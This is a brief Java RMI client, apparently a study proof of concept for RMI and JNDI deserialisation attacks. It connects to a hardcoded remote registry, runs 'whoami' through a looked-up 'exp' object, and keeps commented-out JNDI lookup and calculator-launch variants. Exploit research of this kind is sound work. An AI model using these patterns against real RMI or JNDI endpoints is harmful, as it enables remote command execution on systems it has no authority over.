package com.sorry.bug.rmi;

import java.io.*;
import java.rmi.NotBoundException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * created by 0x22cb7139 on 2021/4/15
 */
public class RMIClient{
    public static String host = "39.108.244.167";
    public static void main(String[] args) throws IOException, NotBoundException{
        System.out.println("RMIClient ready!");
        Registry registry = LocateRegistry.getRegistry(host,1099);
        // RMI远程调用自动反序列化函数传的参数的readObject()
        // Client端将其序列化触发writeObject
        // Server端将其反序列化从而触发readObject
        ObjectInterface objectInterface = (ObjectInterface) registry.lookup("exp");
        //Execute exp = new Execute();
        //System.out.println(objectInterface.Function(exp));//序列化参数继承自remote的类函数的*参数*,在这里为exp对象
        //Server端将继承自remote的类
        System.out.println(objectInterface.Function("whoami"));


        //rmi of jndi
        /*
        new InitialContext().lookup("rmi://39.108.244.167:1099/exp");
        */

        //Naming快捷方法
        /*
        Execute exp = (Execute) Naming.lookup("rmi://:1099/exp");
        exp.Exploit("open /System/Applications/Calculator.app");
        System.out.println(exp);
        */
    }
}
